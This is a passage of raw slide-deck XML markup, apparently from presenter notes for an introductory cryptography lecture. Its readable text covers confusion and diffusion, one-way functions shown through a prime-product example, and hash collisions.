            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1114"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 name="PlaceHolder 1"/>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1116" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3884760" y="8685360"/>
            <a:ext cx="2971080" cy="456480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="b">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="r">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:fld id="{5FE86FFB-78E7-4A90-9A37-94EA7A41BCC1}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>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 name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4278960" y="10157400"/>
            <a:ext cx="3280320" cy="533880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="b">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="b2b2b2"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:defRPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="+mn-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="b2b2b2"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:fld id="{F0CE0088-9636-4E34-913A-F1622E785C1B}" type="slidenum">
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1118" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1119" name="PlaceHolder 3"/>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sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112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22" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="17"/>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r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>This slide deck is for presentations only.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">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sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112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216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Media Notes: </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>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5" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112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216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Media Notes: </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>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7" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112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29" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="18"/>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r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>This slide deck is for presentations only.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>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PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113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32" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="19"/>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r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>This slide deck is for presentations only.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>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PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="20"/>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de-DE" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:fld id="{3E26FB37-18CA-428A-B5B7-1C42E82F0B4A}" type="slidenum">
              <a:rPr b="0" lang="de-DE" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1134" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1135" name="PlaceHolder 3"/>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6" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1137" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756000" y="5078520"/>
            <a:ext cx="6047280" cy="4810680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Confusion</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> refers to making the relationship between the key and the ciphertext as complex and as involved as possible.</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Diffusion</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> refers to the property that redundancy in the statistics of the plaintext is "dissipated" in the statistics of the ciphertext.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1138" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="21"/>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8B465767-9083-4CB1-AD84-D878FAB4F05E}"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9" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114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41" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="22"/>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r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>This slide deck is for presentations only.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>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2" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1143" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="642960" y="4314960"/>
            <a:ext cx="5571720" cy="4248000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1144" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="23"/>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r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>This slide deck is for presentations only.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>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5" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114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47" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="24"/>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r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>This slide deck is for presentations only.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">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8" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1149"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50" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="25"/>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r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>This slide deck is for presentations only.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>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1" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115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216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Here’s an example. Imagine you have a function that multiplies three numbers together. </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>If you restrict the input values to single-digit numbers, it’s a relatively straightforward matter </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>to reverse-engineer this function and determine the possible input values by looking at the </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>numerical output. For example, the output value 15 was created by using the input values 1, </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>3, and 5. However, suppose you restrict the input values to five-digit prime numbers. It’s still </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>quite simple to obtain an output value by using a computer or a good calculator, but reverse-</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>engineering is not quite so simple. Can you figure out what three prime numbers were used to </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>obtain the output value 10,718,488,075,259? Not so simple? (That number is the product </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>of the prime numbers 17,093; 22,441; and 27,943.) There are actually 8,363 five-digit prime </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>numbers, so this problem might be attacked using a computer and a brute-force algorithm, but </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="216000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>there’s no easy way to figure it out in your head, that’s for sure!</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1153" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="26"/>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892FC498-2E62-44B4-9A3B-AF9B5532A2FF}"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4" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="685800"/>
            <a:ext cx="4571640" cy="3428640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115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a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="420"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Some algorithms have issues with predictable collisions</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1156" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
